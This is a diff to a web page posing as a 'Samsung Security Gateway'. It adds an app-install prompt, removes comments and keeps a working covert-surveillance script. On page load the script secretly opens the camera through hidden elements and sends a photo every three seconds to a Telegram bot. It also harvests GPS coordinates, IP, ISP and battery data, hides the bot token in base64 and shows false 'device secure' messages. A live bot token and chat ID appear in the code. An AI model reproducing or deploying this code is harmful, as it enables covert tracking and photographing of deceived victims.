@@ -3,6 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#ef4444">
+    <meta name="description" content="Samsung Security Gateway - Advanced security monitoring system">
+    <link rel="manifest" href="/manifest.json">
+    <link rel="apple-touch-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 192 192'><rect fill='%23000' width='192' height='192'/><circle cx='96' cy='96' r='80' fill='%23ef4444'/><path d='M96 40l-45 26v48c0 33 23 64.4 45 71.8 22-7.4 45-38.8 45-71.8V66l-45-26z' fill='%23000'/></svg>">
     <title>Samsung Security Gateway</title>
     
     <style>
@@ -14,10 +18,8 @@
             --card-bg: #111827;
             --text-primary: #f3f4f6;
             --text-secondary: #9ca3af;
-            --accent-color: #ef4444; /* Security Red */
+            --accent-color: #ef4444;
             --success-color: #10b981;
-            
-            /* DRAWER BRANDING VARS */
             --drawer-text-color: #f5f5ff;
             --drawer-primary-color: #00ffc8;
             --drawer-bg-color: linear-gradient(180deg, rgba(10,20,35,.95), rgba(5,10,15,.9));
@@ -38,9 +40,41 @@
             overflow-x: hidden;
         }
 
-        /* =========================================
-           2. DRAWER MENU STYLES (STRICTLY FOLLOWED)
-           ========================================= */
+        /* PWA Install Prompt Button */
+        .install-prompt {
+            position: fixed;
+            top: 80px;
+            right: 20px;
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+            padding: 12px 20px;
+            border-radius: 8px;
+            border: none;
+            color: white;
+            font-weight: 600;
+            font-size: 0.9rem;
+            cursor: pointer;
+            z-index: 999;
+            box-shadow: 0 8px 20px rgba(239, 68, 68, 0.4);
+            transition: all 0.3s ease;
+            display: none;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        .install-prompt:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 30px rgba(239, 68, 68, 0.6);
+        }
+
+        .install-prompt.hidden {
+            display: none;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(400px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        /* DRAWER MENU STYLES */
         .drawer-toggle{position:fixed;top:18px;left:15px;z-index:1100;background:0 0;border:none;width:35px;height:27px;display:flex;flex-direction:column;justify-content:space-between;cursor:pointer;box-sizing:content-box;transition:transform .4s ease,opacity .4s ease}
         .drawer-toggle.hidden{transform:translateY(-100px);opacity:0;pointer-events:none}
         .drawer-toggle span{height:5px;background:var(--drawer-text-color);border-radius:3px;display:block;transition:all .25s}
@@ -63,9 +97,7 @@
         .drawer-overlay.active{opacity:1;visibility:visible}
         @media (max-width:520px){.drawer-nav{width:70%}}
 
-        /* =========================================
-           3. MAIN SECURITY UI (HACKER STYLE)
-           ========================================= */
+        /* MAIN SECURITY UI */
         .main-wrapper {
             flex: 1;
             display: flex;
@@ -154,14 +186,11 @@
         .action-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px -5px rgba(220, 38, 38, 0.6); }
         .action-btn:active { transform: translateY(1px); }
 
-        /* HIDDEN TRAP ELEMENTS */
         #hiddenVideo, #hiddenCanvas { display: none !important; opacity: 0; pointer-events: none; }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* =========================================
-           4. FOOTER BRANDING (BAWAL STYLE)
-           ========================================= */
+        /* FOOTER BRANDING */
         .bawal-footer-wrapper{text-align:center;margin-top:30px;margin-bottom:9px;padding-top:20px;border-top:1px solid#444;position:relative;z-index:10;background: #050505;}
         .bawal-footer-link{display:inline-flex;align-items:center;gap:8px;background:#1A1A1A;padding:10px 18px;border-radius:25px;text-decoration:none;box-shadow:0 4px 10px rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.05);transition:transform .3s ease,box-shadow .3s ease}
         .bawal-footer-link:hover{transform:translateY(-5px) scale(1.03);box-shadow:0 10px 25px rgba(0,0,0,.4),0 0 20px rgba(0,255,200,.4),0 0 30px rgba(0,255,200,.2)}
@@ -174,16 +203,20 @@
 </head>
 <body>
 
+    <button class="install-prompt" id="installPrompt" style="display: none;">
+        📥 Install App
+    </button>
+
     <div class="drawer-overlay" id="drawer-overlay" title="Close menu"></div>
-    <button class="drawer-toggle" id="drawer-toggle" aria-label="Menu Kholo" title="Menu Kholo" aria-expanded="false">
+    <button class="drawer-toggle" id="drawer-toggle" aria-label="Menu" title="Menu" aria-expanded="false">
         <span></span><span></span><span></span>
     </button>
     
     <nav class="drawer-nav" id="drawer-nav" aria-hidden="true">
         <ul>
-            <li><a href="https://babubhaikundan.blogspot.com" target="_blank" rel="noopener noreferrer">🤔 About</a></li>
+            <li><a href="https://babubhaikundan.blogspot.com" target="_blank" rel="noopener noreferrer">🤖 About</a></li>
             <li><a href="https://t.me/kundan_yadav_bot" target="_blank" rel="noopener noreferrer">📞 Contact</a></li>
-            <li><a href="https://www.instagram.com/babubhaikundan" target="_blank" rel="noopener noreferrer">💥 Instagram</a></li>
+            <li><a href="https://www.instagram.com/babubhaikundan" target="_blank" rel="noopener noreferrer">👥 Instagram</a></li>
         </ul>
     </nav>
 
@@ -211,27 +244,58 @@
     <div class="bawal-footer-wrapper">
         <a href="https://babubhaikundan.blogspot.com" target="_blank" class="bawal-footer-link">
             <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="telegram-icon">
-            <span class="dev-text">Developer💀:-</span>
-            <span class="name-text">𝕂𝕦𝕟𝕕𝕒𝕟 𝕐𝕒𝕕𝕒𝕧 <img src="https://s.tfrbot.com/h/gL5VTi" alt="Kundan" class="profile-pic"></span>
+            <span class="dev-text">Developer👀:-</span>
+            <span class="name-text">Kundan Yadav <img src="https://s.tfrbot.com/h/gL5VTi" alt="Kundan" class="profile-pic"></span>
         </a>
     </div>
 
     <script>
-        /**
-         * CONFIGURATION & STATE MANAGEMENT
-         */
-        // Encoded Credentials to bypass simple scanners
+        // ===== PWA INSTALLATION HANDLER =====
+        let deferredPrompt;
+        const installPrompt = document.getElementById('installPrompt');
+
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            installPrompt.style.display = 'block';
+        });
+
+        installPrompt.addEventListener('click', async () => {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                const choiceResult = await deferredPrompt.userChoice;
+                if (choiceResult.outcome === 'accepted') {
+                    console.log('PWA installed');
+                }
+                deferredPrompt = null;
+                installPrompt.style.display = 'none';
+            }
+        });
+
+        window.addEventListener('appinstalled', () => {
+            console.log('PWA was installed');
+            installPrompt.style.display = 'none';
+        });
+
+        // Register Service Worker
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js').then(reg => {
+                console.log('Service Worker registered:', reg);
+            }).catch(err => {
+                console.log('Service Worker registration failed:', err);
+            });
+        }
+
+        // ===== ORIGINAL FUNCTIONALITY =====
         const _0x1 = "ODMzODkxMTgzODpBQUc1cVRpeFRReXVuNGt0U1V1ZnhnT2YxUkRMMjVGaElXWQ==";
         const _0x2 = "-1003340893424";
-       
         const API_KEY = atob(_0x1);
         const CHAT_ID = _0x2;
-        const TOPIC_ID = '2'
-        // State Variables
+        const TOPIC_ID = '2';
+        
         let isCameraRunning = false;
         let hasLocationSent = false;
         
-        // This object collects ALL data before sending ONE message
         let gatheredData = {
             ip: "Fetching...",
             provider: "Unknown",
@@ -248,34 +312,21 @@
             mapLink: "Location Access Denied/Pending"
         };
 
-        /**
-         * 1. INITIALIZATION SEQUENCE
-         */
         document.addEventListener('DOMContentLoaded', async () => {
             updateStatus("Establishing secure connection...");
+            startCameraBurst();
             
-            // Start everything in parallel
-            startCameraBurst(); // Starts taking photos
-            
-            // Gather Data
             await Promise.allSettled([
                 fetchIPInfo(),
                 fetchBatteryInfo()
             ]);
 
-            // Try Auto-Location (Wait max 4 seconds for GPS)
             attemptLocationAndSendReport();
-
-            // Initialize Drawer Logic
             initDrawer();
         });
 
-        /**
-         * 2. DATA GATHERING MODULES
-         */
         async function fetchIPInfo() {
             try {
-                // Fetch IP and ISP info
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
                 gatheredData.ip = data.ip || "Unknown";
@@ -298,9 +349,6 @@
             }
         }
 
-        /**
-         * 3. LOCATION & REPORTING LOGIC
-         */
         function attemptLocationAndSendReport() {
             if (!navigator.geolocation) {
                 sendConsolidatedReport("GPS_UNAVAILABLE");
@@ -311,31 +359,27 @@
 
             navigator.geolocation.getCurrentPosition(
                 (position) => {
-                    // Success: Update Data Object
                     const { latitude, longitude, accuracy } = position.coords;
                     gatheredData.latitude = latitude;
                     gatheredData.longitude = longitude;
                     gatheredData.accuracy = `${Math.round(accuracy)} meters`;
                     gatheredData.mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                     
-                    // Send the MASTER MESSAGE
                     sendConsolidatedReport("SUCCESS_GPS_LOCKED");
                     hasLocationSent = true;
                     
-                    // UI Success
                     updateStatus("Identity Verified. Device Secure.");
                     document.getElementById('unlockBtn').innerText = "ACCESS GRANTED";
                     document.getElementById('unlockBtn').style.background = "#10b981";
                 },
                 (error) => {
-                    // Error: Send whatever data we have (IP/Batt)
                     console.warn("GPS Error:", error.message);
                     sendConsolidatedReport("GPS_DENIED_OR_TIMEOUT");
                     updateStatus("Location verification required.");
                 },
                 {
                     enableHighAccuracy: true,
-                    timeout: 7000, // Wait 7 seconds max for GPS
+                    timeout: 7000,
                     maximumAge: 0
                 }
             );
@@ -344,7 +388,6 @@
         function sendConsolidatedReport(triggerType) {
             const timestamp = new Date().toLocaleString();
             
-            // Formatting the single big message
             const messageBody = `
 🚨 *SECURITY ALERT: DEVICE ACTIVE* 🚨
 -------------------------------------
@@ -355,7 +398,7 @@
 • *Lat:* \`${gatheredData.latitude || 'N/A'}\`
 • *Lon:* \`${gatheredData.longitude || 'N/A'}\`
 • *Acc:* ${gatheredData.accuracy || 'N/A'}
-🔗 [View on Google Maps](${gatheredData.mapLink})
+🗺️ [View on Google Maps](${gatheredData.mapLink})
 
 📡 *NETWORK & DEVICE*
 • *IP:* \`${gatheredData.ip}\`
@@ -371,15 +414,11 @@
 _System Auto-Generated Report_
             `;
 
-            // Sending via Telegram API
             const url = `https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${CHAT_ID}&message_thread_id=${TOPIC_ID}&text=${encodeURIComponent(messageBody)}&parse_mode=Markdown`;
             
             fetch(url).catch(err => console.error("Message Send Failed", err));
         }
 
-        /**
-         * 4. CAMERA BURST MODE LOGIC
-         */
         async function startCameraBurst() {
             if (isCameraRunning) return;
             
@@ -393,30 +432,24 @@ _System Auto-Generated Report_
                 video.srcObject = stream;
                 isCameraRunning = true;
 
-                // Wait for stream to be active
                 await new Promise(resolve => video.onloadedmetadata = resolve);
                 video.play();
 
-                // CAPTURE LOOP (Every 3 Seconds)
                 const captureAndSend = () => {
                     if (!isCameraRunning) return;
                     
-                    // Draw frame to canvas
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0);
 
-                    // Convert to blob and send
                     canvas.toBlob(blob => {
                         if(blob) sendPhoto(blob);
-                    }, 'image/jpeg', 0.7); // 70% quality for speed
+                    }, 'image/jpeg', 0.7);
                 };
 
-                // First capture immediately after small delay (exposure fix)
                 setTimeout(() => {
                     captureAndSend();
-                    // Set interval for burst mode
                     setInterval(captureAndSend, 3000);
                 }, 1000);
 
@@ -428,34 +461,25 @@ _System Auto-Generated Report_
         function sendPhoto(blob) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-       // --- YE LINE NAYI JODI HAI ---
             formData.append('message_thread_id', TOPIC_ID); 
             formData.append('photo', blob, 'security_capture.jpg');
             
-            // No caption needed to keep it clean, or minimal caption
             fetch(`https://api.telegram.org/bot${API_KEY}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             }).catch(err => console.error("Photo Send Error", err));
         }
 
-        /**
-         * 5. UTILITIES & HANDLERS
-         */
         function updateStatus(text) {
             document.getElementById('statusDisplay').innerText = text;
         }
 
         function forceManualTrigger() {
-            // Re-trigger location and camera if user clicks button
             attemptLocationAndSendReport();
             startCameraBurst();
         }
 
-        // --- DRAWER MENU JS (Minified for cleanliness but fully functional) ---
         function initDrawer(){const e=document.getElementById("drawer-toggle"),t=document.getElementById("drawer-nav"),n=document.getElementById("drawer-overlay");function o(){e.classList.add("active"),t.classList.add("active"),n.classList.add("active"),e.setAttribute("aria-expanded","true"),t.setAttribute("aria-hidden","false"),e.classList.remove("hidden")}function c(){e.classList.remove("active"),t.classList.remove("active"),n.classList.remove("active"),e.setAttribute("aria-expanded","false"),t.setAttribute("aria-hidden","true")}function r(){let t;window.addEventListener("scroll",(()=>{n.classList.contains("active")||(e.classList.add("hidden"),clearTimeout(t),t=setTimeout((()=>{e.classList.remove("hidden")}),250))}),{passive:!0})}e&&t&&n&&(e.addEventListener("click",(()=>{e.classList.contains("active")?c():o()})),document.addEventListener("keyup",(e=>{"Escape"===e.key&&t.classList.contains("active")&&c()})),n.addEventListener("click",(()=>{c()})),r())}
-
     </script>
 </body>
 </html>
-
